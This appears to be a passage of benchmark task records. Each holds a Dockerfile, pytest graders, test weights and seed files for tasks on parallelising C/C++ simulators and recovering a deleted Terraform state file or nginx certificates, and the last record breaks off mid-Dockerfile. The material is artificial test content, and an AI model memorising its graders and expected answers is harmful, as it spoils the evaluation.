COPY pricer_common.h /app/

RUN make serial

CMD [""/bin/bash""]","import subprocess
import os

def test_openmp_pricer_accuracy():
    """"""Test that OpenMP pricer produces results within 0.1% of serial version""""""
    # Check that OpenMP version was built
    assert os.path.exists('/app/pricer_openmp'), ""OpenMP pricer not built""
    
    # Run serial version to get baseline
    serial_result = subprocess.run(
        ['/app/pricer_serial', '100', '100', '0.05', '0.2', '1', '1000000'],
        capture_output=True, text=True
    )
    assert serial_result.returncode == 0, ""Serial pricer failed""
    
    # Extract prices from serial output
    serial_lines = serial_result.stdout.strip().split('\n')
    serial_call = float(serial_lines[0].split(': ')[1])
    serial_put = float(serial_lines[1].split(': ')[1])
    
    # Run OpenMP version
    openmp_result = subprocess.run(
        ['/app/pricer_openmp', '100', '100', '0.05', '0.2', '1', '1000000'],
        capture_output=True, text=True, env={**os.environ, 'OMP_NUM_THREADS': '4'}
    )
    assert openmp_result.returncode == 0, ""OpenMP pricer failed""
    
    # Extract prices from OpenMP output
    openmp_lines = openmp_result.stdout.strip().split('\n')
    openmp_call = float(openmp_lines[0].split(': ')[1])
    openmp_put = float(openmp_lines[1].split(': ')[1])
    
    # Check accuracy within 0.1%
    call_diff = abs(openmp_call - serial_call) / serial_call
    put_diff = abs(openmp_put - serial_put) / serial_put
    
    assert call_diff < 0.001, f""Call price difference {call_diff:.4%} exceeds 0.1%""
    assert put_diff < 0.001, f""Put price difference {put_diff:.4%} exceeds 0.1%""

def test_openmp_pricer_speedup():
    """"""Test that OpenMP pricer achieves at least 3x speedup on 8 cores""""""
    # Run serial version with large simulation count
    serial_result = subprocess.run(
        ['/app/pricer_serial', '100', '100', '0.05', '0.2', '1', '10000000'],
        capture_output=True, text=True
    )
    serial_time = float(serial_result.stdout.strip().split('\n')[2].split(': ')[1].split()[0])
    
    # Run OpenMP version with 8 threads
    openmp_result = subprocess.run(
        ['/app/pricer_openmp', '100', '100', '0.05', '0.2', '1', '10000000'],
        capture_output=True, text=True, env={**os.environ, 'OMP_NUM_THREADS': '8'}
    )
    openmp_time = float(openmp_result.stdout.strip().split('\n')[2].split(': ')[1].split()[0])
    
    speedup = serial_time / openmp_time
    assert speedup >= 3.0, f""Speedup {speedup:.2f}x is less than required 3x""","{""test_openmp_pricer_accuracy"": 0.4, ""test_openmp_pricer_speedup"": 0.6}","{""monte_carlo_pricer.cpp"": ""#include <iostream>\n#include <cstdlib>\n#include <cmath>\n#include <chrono>\n#include <random>\n#include <iomanip>\n#include \""pricer_common.h\""\n\n#ifdef USE_OPENMP\n#include <omp.h>\n#endif\n\nvoid monte_carlo_price(const OptionParams& params, double& call_price, double& put_price) {\n    std::mt19937 gen(42);\n    std::uniform_real_distribution<> dis(0.0, 1.0);\n    \n    double sum_call = 0.0;\n    double sum_put = 0.0;\n    double dt = params.time_to_maturity;\n    double drift = (params.risk_free_rate - 0.5 * params.volatility * params.volatility) * dt;\n    double diffusion = params.volatility * sqrt(dt);\n    \n    for (int i = 0; i < params.num_simulations; ++i) {\n        double u1 = dis(gen);\n        double u2 = dis(gen);\n        double z = box_muller_transform(u1, u2);\n        \n        double stock_price = params.spot_price * exp(drift + diffusion * z);\n        double call_payoff = std::max(stock_price - params.strike_price, 0.0);\n        double put_payoff = std::max(params.strike_price - stock_price, 0.0);\n        \n        sum_call += call_payoff;\n        sum_put += put_payoff;\n    }\n    \n    double discount = exp(-params.risk_free_rate * params.time_to_maturity);\n    call_price = discount * sum_call / params.num_simulations;\n    put_price = discount * sum_put / params.num_simulations;\n}\n\nvoid print_usage(const char* program_name) {\n    std::cerr << \""Usage: \"" << program_name << \"" <spot> <strike> <rate> <volatility> <time> <simulations>\"" << std::endl;\n    std::cerr << \""  spot: Current price of the underlying asset\"" << std::endl;\n    std::cerr << \""  strike: Strike price of the option\"" << std::endl;\n    std::cerr << \""  rate: Risk-free interest rate (as decimal)\"" << std::endl;\n    std::cerr << \""  volatility: Volatility of the underlying (as decimal)\"" << std::endl;\n    std::cerr << \""  time: Time to maturity in years\"" << std::endl;\n    std::cerr << \""  simulations: Number of Monte Carlo simulations\"" << std::endl;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 7) {\n        print_usage(argv[0]);\n        return 1;\n    }\n    \n    OptionParams params;\n    params.spot_price = std::atof(argv[1]);\n    params.strike_price = std::atof(argv[2]);\n    params.risk_free_rate = std::atof(argv[3]);\n    params.volatility = std::atof(argv[4]);\n    params.time_to_maturity = std::atof(argv[5]);\n    params.num_simulations = std::atoi(argv[6]);\n    \n    if (params.num_simulations <= 0) {\n        std::cerr << \""Error: Number of simulations must be positive\"" << std::endl;\n        return 1;\n    }\n    \n    double call_price, put_price;\n    \n    auto start = std::chrono::high_resolution_clock::now();\n    monte_carlo_price(params, call_price, put_price);\n    auto end = std::chrono::high_resolution_clock::now();\n    \n    std::chrono::duration<double> diff = end - start;\n    \n    std::cout << std::fixed << std::setprecision(6);\n    std::cout << \""Call Price: \"" << call_price << std::endl;\n    std::cout << \""Put Price: \"" << put_price << std::endl;\n    std::cout << \""Execution Time: \"" << diff.count() << \"" seconds\"" << std::endl;\n    \n    return 0;\n}"", ""Makefile"": ""CXX = g++\nCXXFLAGS = -Wall -O3 -std=c++11\nOMPFLAGS = -fopenmp\n\nall: serial\n\nserial: monte_carlo_pricer.cpp pricer_common.h\n\t$(CXX) $(CXXFLAGS) -o pricer_serial monte_carlo_pricer.cpp\n\nopenmp: monte_carlo_pricer.cpp pricer_common.h\n\t$(CXX) $(CXXFLAGS) $(OMPFLAGS) -DUSE_OPENMP -o pricer_openmp monte_carlo_pricer.cpp\n\nclean:\n\trm -f pricer_serial pricer_openmp\n\n.PHONY: all clean"", ""pricer_common.h"": ""#ifndef PRICER_COMMON_H\n#define PRICER_COMMON_H\n\n#include <cmath>\n\nstruct OptionParams {\n    double spot_price;\n    double strike_price;\n    double risk_free_rate;\n    double volatility;\n    double time_to_maturity;\n    int num_simulations;\n};\n\ninline double normal_cdf(double x) {\n    return 0.5 * (1.0 + erf(x / sqrt(2.0)));\n}\n\ninline double box_muller_transform(double u1, double u2) {\n    return sqrt(-2.0 * log(u1)) * cos(2.0 * M_PI * u2);\n}\n\n#endif""}",2025-07-23T09:44:24.244360+00:00,2025-07-23T09:44:24.274716+00:00
draft_dp_b2fe92c8,medium,draft_dp_b2fe92c8,scientific-computing,"Need to parallelize our Game of Life simulator. Create OpenMP and MPI versions alongside the existing serial version, ensuring all three produce identical results for the same inputs.",scientific-computing,C|parallel-computing|optimization,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    gcc \
    g++ \
    make \
    openmpi-bin \
    libopenmpi-dev \
    libomp-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY game_of_life_serial.c /app/
COPY Makefile /app/
COPY test_pattern.txt /app/

RUN make serial

CMD [""/bin/bash""]","import subprocess
import os

def test_all_versions_compile_and_run():
    """"""Test that all three versions (serial, OpenMP, MPI) compile and execute successfully.""""""
    # Check that all three executables exist
    assert os.path.exists('/app/gol_serial'), ""Serial version not compiled""
    assert os.path.exists('/app/gol_openmp'), ""OpenMP version not compiled""
    assert os.path.exists('/app/gol_mpi'), ""MPI version not compiled""
    
    # Test serial version runs
    result = subprocess.run(['/app/gol_serial', '50', '50', '10', 'random'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, ""Serial version failed to run""
    assert ""Grid: 50x50"" in result.stdout, ""Serial version output format incorrect""
    
    # Test OpenMP version runs
    result = subprocess.run(['/app/gol_openmp', '50', '50', '10', 'random'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, ""OpenMP version failed to run""
    
    # Test MPI version runs with 2 processes
    result = subprocess.run(['mpirun', '-np', '2', '/app/gol_mpi', '50', '50', '10', 'random'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, ""MPI version failed to run""

def test_all_versions_produce_identical_results():
    """"""Test that all three versions produce the same final state for a deterministic pattern.""""""
    # Run all three versions with the same glider pattern
    serial_result = subprocess.run(['/app/gol_serial', '20', '20', '5', 'glider'], 
                                 capture_output=True, text=True)
    openmp_result = subprocess.run(['/app/gol_openmp', '20', '20', '5', 'glider'], 
                                 capture_output=True, text=True)
    mpi_result = subprocess.run(['mpirun', '-np', '1', '/app/gol_mpi', '20', '20', '5', 'glider'], 
                              capture_output=True, text=True)
    
    # Extract live cell counts from outputs
    def extract_live_cells(output):
        for line in output.split('\n'):
            if line.startswith('Live cells:'):
                return int(line.split(':')[1].strip())
        return -1
    
    serial_cells = extract_live_cells(serial_result.stdout)
    openmp_cells = extract_live_cells(openmp_result.stdout)
    mpi_cells = extract_live_cells(mpi_result.stdout)
    
    assert serial_cells > 0, ""Serial version didn't report live cells""
    assert serial_cells == openmp_cells, f""OpenMP result differs: {serial_cells} vs {openmp_cells}""
    assert serial_cells == mpi_cells, f""MPI result differs: {serial_cells} vs {mpi_cells}""","{""test_all_versions_compile_and_run"": 0.4, ""test_all_versions_produce_identical_results"": 0.6}","{""Makefile"": ""CC = gcc\nCFLAGS = -O2 -Wall\nOMPFLAGS = -fopenmp\nMPICC = mpicc\n\nall: serial\n\nserial: game_of_life_serial.c\n\t$(CC) $(CFLAGS) -o gol_serial game_of_life_serial.c\n\nclean:\n\trm -f gol_serial gol_openmp gol_mpi"", ""test_pattern.txt"": ""5 5\n5 6\n6 5\n6 6\n2 3\n3 2\n3 3\n3 4\n4 3"", ""game_of_life_serial.c"": ""#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n\n#define ALIVE 1\n#define DEAD 0\n\ntypedef struct {\n    int rows;\n    int cols;\n    int **grid;\n} Grid;\n\nGrid* create_grid(int rows, int cols) {\n    Grid *g = malloc(sizeof(Grid));\n    g->rows = rows;\n    g->cols = cols;\n    g->grid = malloc(rows * sizeof(int*));\n    for (int i = 0; i < rows; i++) {\n        g->grid[i] = calloc(cols, sizeof(int));\n    }\n    return g;\n}\n\nvoid free_grid(Grid *g) {\n    for (int i = 0; i < g->rows; i++) {\n        free(g->grid[i]);\n    }\n    free(g->grid);\n    free(g);\n}\n\nint count_neighbors(Grid *g, int row, int col) {\n    int count = 0;\n    for (int i = -1; i <= 1; i++) {\n        for (int j = -1; j <= 1; j++) {\n            if (i == 0 && j == 0) continue;\n            int new_row = row + i;\n            int new_col = col + j;\n            if (new_row >= 0 && new_row < g->rows && \n                new_col >= 0 && new_col < g->cols) {\n                count += g->grid[new_row][new_col];\n            }\n        }\n    }\n    return count;\n}\n\nvoid evolve(Grid *current, Grid *next) {\n    for (int i = 0; i < current->rows; i++) {\n        for (int j = 0; j < current->cols; j++) {\n            int neighbors = count_neighbors(current, i, j);\n            if (current->grid[i][j] == ALIVE) {\n                next->grid[i][j] = (neighbors == 2 || neighbors == 3) ? ALIVE : DEAD;\n            } else {\n                next->grid[i][j] = (neighbors == 3) ? ALIVE : DEAD;\n            }\n        }\n    }\n}\n\nvoid init_random(Grid *g, float density) {\n    srand(42);  // Fixed seed for reproducibility\n    for (int i = 0; i < g->rows; i++) {\n        for (int j = 0; j < g->cols; j++) {\n            g->grid[i][j] = (rand() / (float)RAND_MAX < density) ? ALIVE : DEAD;\n        }\n    }\n}\n\nvoid init_glider(Grid *g) {\n    if (g->rows >= 10 && g->cols >= 10) {\n        g->grid[1][2] = ALIVE;\n        g->grid[2][3] = ALIVE;\n        g->grid[3][1] = ALIVE;\n        g->grid[3][2] = ALIVE;\n        g->grid[3][3] = ALIVE;\n    }\n}\n\nint count_alive(Grid *g) {\n    int count = 0;\n    for (int i = 0; i < g->rows; i++) {\n        for (int j = 0; j < g->cols; j++) {\n            count += g->grid[i][j];\n        }\n    }\n    return count;\n}\n\nvoid load_pattern(Grid *g, const char *filename) {\n    FILE *f = fopen(filename, \""r\"");\n    if (!f) {\n        fprintf(stderr, \""Could not open pattern file\\n\"");\n        exit(1);\n    }\n    \n    int row, col;\n    while (fscanf(f, \""%d %d\"", &row, &col) == 2) {\n        if (row >= 0 && row < g->rows && col >= 0 && col < g->cols) {\n            g->grid[row][col] = ALIVE;\n        }\n    }\n    fclose(f);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 4) {\n        fprintf(stderr, \""Usage: %s <rows> <cols> <iterations> [pattern]\\n\"", argv[0]);\n        fprintf(stderr, \""Pattern can be: random, glider, or filename\\n\"");\n        return 1;\n    }\n    \n    int rows = atoi(argv[1]);\n    int cols = atoi(argv[2]);\n    int iterations = atoi(argv[3]);\n    const char *pattern = (argc > 4) ? argv[4] : \""random\"";\n    \n    Grid *current = create_grid(rows, cols);\n    Grid *next = create_grid(rows, cols);\n    \n    if (strcmp(pattern, \""random\"") == 0) {\n        init_random(current, 0.3);\n    } else if (strcmp(pattern, \""glider\"") == 0) {\n        init_glider(current);\n    } else {\n        load_pattern(current, pattern);\n    }\n    \n    clock_t start = clock();\n    \n    for (int iter = 0; iter < iterations; iter++) {\n        evolve(current, next);\n        Grid *temp = current;\n        current = next;\n        next = temp;\n    }\n    \n    clock_t end = clock();\n    double time_spent = (double)(end - start) / CLOCKS_PER_SEC;\n    \n    printf(\""Grid: %dx%d\\n\"", rows, cols);\n    printf(\""Iterations: %d\\n\"", iterations);\n    printf(\""Live cells: %d\\n\"", count_alive(current));\n    printf(\""Time: %.6f seconds\\n\"", time_spent);\n    \n    free_grid(current);\n    free_grid(next);\n    \n    return 0;\n}""}",2025-07-23T09:43:09.805149+00:00,2025-07-23T09:43:09.837852+00:00
draft_dp_5c5cf011,hard,draft_dp_5c5cf011,system-administration,"The production Terraform state file got deleted during a migration. We need those AWS resource IDs (VPCs, subnets, RDS instances) back urgently to avoid duplicating infrastructure. Recover the state file from /infrastructure/production/ and save to /infrastructure/recovered_state.json.",system-administration,file-recovery|sys-admin|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /

# Install pytest and jq
RUN pip install pytest && \
    apt-get update || true && \
    apt-get install -y jq || true

# Copy the terraform state file and setup script
COPY terraform.tfstate /terraform.tfstate
COPY setup_environment.sh /setup_environment.sh

# Make setup script executable
RUN chmod +x /setup_environment.sh

# Run the setup to create and delete the file
RUN /setup_environment.sh

# Set working directory
WORKDIR /infrastructure","import os
import json
import re

def test_recovered_state_file_exists():
    """"""Test that the recovered state file exists and contains valid JSON""""""
    assert os.path.exists('/infrastructure/recovered_state.json'), ""recovered_state.json not found""
    
    with open('/infrastructure/recovered_state.json', 'r') as f:
        data = json.load(f)
    
    # Basic structure validation
    assert 'version' in data, ""Missing version field""
    assert 'resources' in data, ""Missing resources field""
    assert isinstance(data['resources'], list), ""Resources should be a list""
    assert len(data['resources']) > 0, ""Resources list is empty""

def test_aws_resource_ids_recovered():
    """"""Test that critical AWS resource IDs are present in recovered state""""""
    with open('/infrastructure/recovered_state.json', 'r') as f:
        content = f.read()
        data = json.loads(content)
    
    # Check for AWS resource ID patterns in the JSON content
    vpc_pattern = r'vpc-[0-9a-f]{17}'
    subnet_pattern = r'subnet-[0-9a-f]{17}'
    db_pattern = r'db-[A-Z0-9]{26}'
    ecs_pattern = r'ecs-cluster-[a-z0-9\-]+'
    
    vpc_found = bool(re.search(vpc_pattern, content))
    subnet_found = bool(re.search(subnet_pattern, content))
    db_found = bool(re.search(db_pattern, content))
    ecs_found = bool(re.search(ecs_pattern, content))
    
    assert vpc_found, ""No VPC IDs found in recovered state""
    assert subnet_found, ""No subnet IDs found in recovered state""
    assert db_found, ""No RDS instance IDs found in recovered state""
    assert ecs_found, ""No ECS cluster names found in recovered state""
    
    # Verify specific resource types exist
    resource_types = [r['type'] for r in data['resources']]
    assert 'aws_vpc' in resource_types, ""aws_vpc resource type not found""
    assert 'aws_subnet' in resource_types, ""aws_subnet resource type not found""
    assert 'aws_db_instance' in resource_types, ""aws_db_instance resource type not found""
    assert 'aws_ecs_cluster' in resource_types, ""aws_ecs_cluster resource type not found""","{""test_recovered_state_file_exists"": 0.3, ""test_aws_resource_ids_recovered"": 0.7}","{""terraform.tfstate"": ""{\n  \""version\"": 4,\n  \""terraform_version\"": \""1.5.7\"",\n  \""serial\"": 42,\n  \""lineage\"": \""8a2c4b0e-1234-5678-90ab-cdef12345678\"",\n  \""outputs\"": {\n    \""vpc_id\"": {\n      \""value\"": \""vpc-0a1b2c3d4e5f67890\"",\n      \""type\"": \""string\""\n    },\n    \""db_endpoint\"": {\n      \""value\"": \""prod-db.c9x8y7z6w5v4.us-east-1.rds.amazonaws.com\"",\n      \""type\"": \""string\""\n    }\n  },\n  \""resources\"": [\n    {\n      \""mode\"": \""managed\"",\n      \""type\"": \""aws_vpc\"",\n      \""name\"": \""main\"",\n      \""provider\"": \""provider[\\\""registry.terraform.io/hashicorp/aws\\\""]\"",\n      \""instances\"": [\n        {\n          \""schema_version\"": 1,\n          \""attributes\"": {\n            \""arn\"": \""arn:aws:ec2:us-east-1:123456789012:vpc/vpc-0a1b2c3d4e5f67890\"",\n            \""assign_generated_ipv6_cidr_block\"": false,\n            \""cidr_block\"": \""10.0.0.0/16\"",\n            \""default_network_acl_id\"": \""acl-0987654321fedcba0\"",\n            \""default_route_table_id\"": \""rtb-0fedcba9876543210\"",\n            \""default_security_group_id\"": \""sg-0123456789abcdef0\"",\n            \""dhcp_options_id\"": \""dopt-0abcdef1234567890\"",\n            \""enable_dns_hostnames\"": true,\n            \""enable_dns_support\"": true,\n            \""id\"": \""vpc-0a1b2c3d4e5f67890\"",\n            \""instance_tenancy\"": \""default\"",\n            \""ipv6_association_id\"": \""\"",\n            \""ipv6_cidr_block\"": \""\"",\n            \""main_route_table_id\"": \""rtb-0fedcba9876543210\"",\n            \""owner_id\"": \""123456789012\"",\n            \""tags\"": {\n              \""Environment\"": \""production\"",\n              \""Name\"": \""prod-vpc\""\n            },\n            \""tags_all\"": {\n              \""Environment\"": \""production\"",\n              \""Name\"": \""prod-vpc\"",\n              \""ManagedBy\"": \""terraform\""\n            }\n          },\n          \""sensitive_attributes\"": []\n        }\n      ]\n    },\n    {\n      \""mode\"": \""managed\"",\n      \""type\"": \""aws_subnet\"",\n      \""name\"": \""public\"",\n      \""provider\"": \""provider[\\\""registry.terraform.io/hashicorp/aws\\\""]\"",\n      \""instances\"": [\n        {\n          \""index_key\"": 0,\n          \""schema_version\"": 1,\n          \""attributes\"": {\n            \""arn\"": \""arn:aws:ec2:us-east-1:123456789012:subnet/subnet-0123456789abcdef1\"",\n            \""assign_ipv6_address_on_creation\"": false,\n            \""availability_zone\"": \""us-east-1a\"",\n            \""availability_zone_id\"": \""use1-az1\"",\n            \""cidr_block\"": \""10.0.1.0/24\"",\n            \""id\"": \""subnet-0123456789abcdef1\"",\n            \""ipv6_cidr_block\"": \""\"",\n            \""ipv6_cidr_block_association_id\"": \""\"",\n            \""map_public_ip_on_launch\"": true,\n            \""owner_id\"": \""123456789012\"",\n            \""tags\"": {\n              \""Name\"": \""prod-public-subnet-1\"",\n              \""Type\"": \""public\""\n            },\n            \""tags_all\"": {\n              \""Name\"": \""prod-public-subnet-1\"",\n              \""Type\"": \""public\"",\n              \""ManagedBy\"": \""terraform\""\n            },\n            \""vpc_id\"": \""vpc-0a1b2c3d4e5f67890\""\n          },\n          \""sensitive_attributes\"": []\n        },\n        {\n          \""index_key\"": 1,\n          \""schema_version\"": 1,\n          \""attributes\"": {\n            \""arn\"": \""arn:aws:ec2:us-east-1:123456789012:subnet/subnet-0fedcba9876543212\"",\n            \""assign_ipv6_address_on_creation\"": false,\n            \""availability_zone\"": \""us-east-1b\"",\n            \""availability_zone_id\"": \""use1-az2\"",\n            \""cidr_block\"": \""10.0.2.0/24\"",\n            \""id\"": \""subnet-0fedcba9876543212\"",\n            \""ipv6_cidr_block\"": \""\"",\n            \""ipv6_cidr_block_association_id\"": \""\"",\n            \""map_public_ip_on_launch\"": true,\n            \""owner_id\"": \""123456789012\"",\n            \""tags\"": {\n              \""Name\"": \""prod-public-subnet-2\"",\n              \""Type\"": \""public\""\n            },\n            \""tags_all\"": {\n              \""Name\"": \""prod-public-subnet-2\"",\n              \""Type\"": \""public\"",\n              \""ManagedBy\"": \""terraform\""\n            },\n            \""vpc_id\"": \""vpc-0a1b2c3d4e5f67890\""\n          },\n          \""sensitive_attributes\"": []\n        }\n      ]\n    },\n    {\n      \""mode\"": \""managed\"",\n      \""type\"": \""aws_subnet\"",\n      \""name\"": \""private\"",\n      \""provider\"": \""provider[\\\""registry.terraform.io/hashicorp/aws\\\""]\"",\n      \""instances\"": [\n        {\n          \""index_key\"": 0,\n          \""schema_version\"": 1,\n          \""attributes\"": {\n            \""arn\"": \""arn:aws:ec2:us-east-1:123456789012:subnet/subnet-0abcdef1234567893\"",\n            \""assign_ipv6_address_on_creation\"": false,\n            \""availability_zone\"": \""us-east-1a\"",\n            \""availability_zone_id\"": \""use1-az1\"",\n            \""cidr_block\"": \""10.0.10.0/24\"",\n            \""id\"": \""subnet-0abcdef1234567893\"",\n            \""ipv6_cidr_block\"": \""\"",\n            \""ipv6_cidr_block_association_id\"": \""\"",\n            \""map_public_ip_on_launch\"": false,\n            \""owner_id\"": \""123456789012\"",\n            \""tags\"": {\n              \""Name\"": \""prod-private-subnet-1\"",\n              \""Type\"": \""private\""\n            },\n            \""tags_all\"": {\n              \""Name\"": \""prod-private-subnet-1\"",\n              \""Type\"": \""private\"",\n              \""ManagedBy\"": \""terraform\""\n            },\n            \""vpc_id\"": \""vpc-0a1b2c3d4e5f67890\""\n          },\n          \""sensitive_attributes\"": []\n        },\n        {\n          \""index_key\"": 1,\n          \""schema_version\"": 1,\n          \""attributes\"": {\n            \""arn\"": \""arn:aws:ec2:us-east-1:123456789012:subnet/subnet-0987654321fedcba4\"",\n            \""assign_ipv6_address_on_creation\"": false,\n            \""availability_zone\"": \""us-east-1b\"",\n            \""availability_zone_id\"": \""use1-az2\"",\n            \""cidr_block\"": \""10.0.11.0/24\"",\n            \""id\"": \""subnet-0987654321fedcba4\"",\n            \""ipv6_cidr_block\"": \""\"",\n            \""ipv6_cidr_block_association_id\"": \""\"",\n            \""map_public_ip_on_launch\"": false,\n            \""owner_id\"": \""123456789012\"",\n            \""tags\"": {\n              \""Name\"": \""prod-private-subnet-2\"",\n              \""Type\"": \""private\""\n            },\n            \""tags_all\"": {\n              \""Name\"": \""prod-private-subnet-2\"",\n              \""Type\"": \""private\"",\n              \""ManagedBy\"": \""terraform\""\n            },\n            \""vpc_id\"": \""vpc-0a1b2c3d4e5f67890\""\n          },\n          \""sensitive_attributes\"": []\n        }\n      ]\n    },\n    {\n      \""mode\"": \""managed\"",\n      \""type\"": \""aws_db_instance\"",\n      \""name\"": \""main\"",\n      \""provider\"": \""provider[\\\""registry.terraform.io/hashicorp/aws\\\""]\"",\n      \""instances\"": [\n        {\n          \""schema_version\"": 1,\n          \""attributes\"": {\n            \""address\"": \""prod-db.c9x8y7z6w5v4.us-east-1.rds.amazonaws.com\"",\n            \""allocated_storage\"": 100,\n            \""arn\"": \""arn:aws:rds:us-east-1:123456789012:db:prod-db\"",\n            \""auto_minor_version_upgrade\"": true,\n            \""availability_zone\"": \""us-east-1a\"",\n            \""backup_retention_period\"": 7,\n            \""backup_window\"": \""03:00-04:00\"",\n            \""ca_cert_identifier\"": \""rds-ca-2019\"",\n            \""copy_tags_to_snapshot\"": true,\n            \""db_name\"": \""proddb\"",\n            \""db_subnet_group_name\"": \""prod-db-subnet-group\"",\n            \""deletion_protection\"": true,\n            \""enabled_cloudwatch_logs_exports\"": [\""postgresql\""],\n            \""endpoint\"": \""prod-db.c9x8y7z6w5v4.us-east-1.rds.amazonaws.com:5432\"",\n            \""engine\"": \""postgres\"",\n            \""engine_version\"": \""14.7\"",\n            \""hosted_zone_id\"": \""Z2R2ITUGPM61AM\"",\n            \""iam_database_authentication_enabled\"": false,\n            \""id\"": \""db-ABCDEFGHIJKLMNOPQRSTUVWXYZ\"",\n            \""identifier\"": \""prod-db\"",\n            \""instance_class\"": \""db.r6i.large\"",\n            \""iops\"": 0,\n            \""kms_key_id\"": \""\"",\n            \""license_model\"": \""postgresql-license\"",\n            \""maintenance_window\"": \""sun:04:00-sun:05:00\"",\n            \""max_allocated_storage\"": 500,\n            \""monitoring_interval\"": 60,\n            \""monitoring_role_arn\"": \""arn:aws:iam::123456789012:role/rds-monitoring-role\"",\n            \""multi_az\"": true,\n            \""name\"": \""proddb\"",\n            \""option_group_name\"": \""default:postgres-14\"",\n            \""parameter_group_name\"": \""default.postgres14\"",\n            \""password\"": null,\n            \""performance_insights_enabled\"": true,\n            \""performance_insights_kms_key_id\"": \""arn:aws:kms:us-east-1:123456789012:key/12345678-1234-1234-1234-123456789012\"",\n            \""performance_insights_retention_period\"": 7,\n            \""port\"": 5432,\n            \""publicly_accessible\"": false,\n            \""replica_mode\"": \""\"",\n            \""replicate_source_db\"": \""\"",\n            \""resource_id\"": \""db-ABCDEFGHIJKLMNOPQRSTUVWXYZ\"",\n            \""restore_to_point_in_time\"": [],\n            \""s3_import\"": [],\n            \""security_group_names\"": [],\n            \""skip_final_snapshot\"": false,\n            \""snapshot_identifier\"": \""\"",\n            \""status\"": \""available\"",\n            \""storage_encrypted\"": true,\n            \""storage_type\"": \""gp3\"",\n            \""tags\"": {\n              \""Environment\"": \""production\"",\n              \""Name\"": \""prod-db\""\n            },\n            \""tags_all\"": {\n              \""Environment\"": \""production\"",\n              \""Name\"": \""prod-db\"",\n              \""ManagedBy\"": \""terraform\""\n            },\n            \""timeouts\"": null,\n            \""timezone\"": \""\"",\n            \""username\"": \""dbadmin\"",\n            \""vpc_security_group_ids\"": [\""sg-0abcdef1234567890\""]\n          },\n          \""sensitive_attributes\"": [\n            [\n              {\n                \""type\"": \""get_attr\"",\n                \""value\"": \""password\""\n              }\n            ]\n          ]\n        }\n      ]\n    },\n    {\n      \""mode\"": \""managed\"",\n      \""type\"": \""aws_ecs_cluster\"",\n      \""name\"": \""main\"",\n      \""provider\"": \""provider[\\\""registry.terraform.io/hashicorp/aws\\\""]\"",\n      \""instances\"": [\n        {\n          \""schema_version\"": 0,\n          \""attributes\"": {\n            \""arn\"": \""arn:aws:ecs:us-east-1:123456789012:cluster/ecs-cluster-prod\"",\n            \""capacity_providers\"": [\""FARGATE\"", \""FARGATE_SPOT\""],\n            \""configuration\"": [],\n            \""default_capacity_provider_strategy\"": [\n              {\n                \""base\"": 1,\n                \""capacity_provider\"": \""FARGATE\"",\n                \""weight\"": 1\n              }\n            ],\n            \""id\"": \""arn:aws:ecs:us-east-1:123456789012:cluster/ecs-cluster-prod\"",\n            \""name\"": \""ecs-cluster-prod\"",\n            \""service_connect_defaults\"": [],\n            \""setting\"": [\n              {\n                \""name\"": \""containerInsights\"",\n                \""value\"": \""enabled\""\n              }\n            ],\n            \""tags\"": {\n              \""Environment\"": \""production\"",\n              \""Name\"": \""ecs-cluster-prod\""\n            },\n            \""tags_all\"": {\n              \""Environment\"": \""production\"",\n              \""Name\"": \""ecs-cluster-prod\"",\n              \""ManagedBy\"": \""terraform\""\n            }\n          },\n          \""sensitive_attributes\"": []\n        }\n      ]\n    }\n  ]\n}"", ""setup_environment.sh"": ""#!/bin/bash\n\n# Create the infrastructure directory\nmkdir -p /infrastructure/production\n\n# Copy the Terraform state file\ncp /terraform.tfstate /infrastructure/production/terraform.tfstate\n\n# Create some other JSON files to make recovery more challenging\ncat > /infrastructure/production/config.json << 'EOF'\n{\n  \""api_endpoint\"": \""https://api.prod.example.com\"",\n  \""database\"": {\n    \""host\"": \""db.example.com\"",\n    \""port\"": 5432\n  }\n}\nEOF\n\ncat > /infrastructure/production/services.json << 'EOF'\n{\n  \""services\"": [\n    {\""name\"": \""api\"", \""port\"": 8080},\n    {\""name\"": \""web\"", \""port\"": 3000}\n  ]\n}\nEOF\n\n# Create some Terraform files\ncat > /infrastructure/production/main.tf << 'EOF'\nresource \""aws_vpc\"" \""main\"" {\n  cidr_block = \""10.0.0.0/16\""\n}\nEOF\n\ncat > /infrastructure/production/variables.tf << 'EOF'\nvariable \""region\"" {\n  default = \""us-east-1\""\n}\nEOF\n\n# Create a backup directory with old snapshots (simulating typical backup behavior)\nmkdir -p /var/backups/terraform\ncp /terraform.tfstate /var/backups/terraform/.tfstate.swp\necho '{\""partial\"": true}' > /var/backups/terraform/incomplete.json\n\n# Create temp directory with various files\nmkdir -p /tmp/terraform_work\ncp /terraform.tfstate /tmp/terraform_work/.terraform.tfstate.tmp\necho \""temporary work\"" > /tmp/terraform_work/notes.txt\n\n# Wait a moment to ensure files are written\nsync\nsleep 1\n\n# Delete the terraform state file to simulate accidental deletion\nrm -f /infrastructure/production/terraform.tfstate\n\n# But leave traces in various locations that could be recovered""}",2025-07-23T09:44:46.984096+00:00,2025-07-23T09:59:37.259284+00:00
draft_dp_5565e348,hard,draft_dp_5565e348,system-administration,Someone deleted /etc/nginx/ssl/ with our production certs. Need to recover the *.company.com and api-*.company.com certificates and keys ASAP. Store recovered files in /etc/nginx/ssl_recovered/.,system-administration,file-recovery|security|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /root

# Setup directories (simulating nginx installation)
RUN mkdir -p /etc/nginx/sites-available /etc/nginx/sites-enabled /etc/nginx/ssl /var/www/main \
    /var/log/nginx /var/backups/nginx/2024-01-15 /tmp /etc/nginx/ssl_recovered

# Copy config files
COPY site1.conf /etc/nginx/sites-available/
COPY site2.conf /etc/nginx/sites-available/

# Copy pre-generated certificates to the SSL directory
COPY www.company.com.crt /etc/nginx/ssl/
COPY www.company.com.key /etc/nginx/ssl/
COPY api-prod.company.com.crt /etc/nginx/ssl/
COPY api-prod.company.com.key /etc/nginx/ssl/
COPY api-dev.company.com.crt /etc/nginx/ssl/
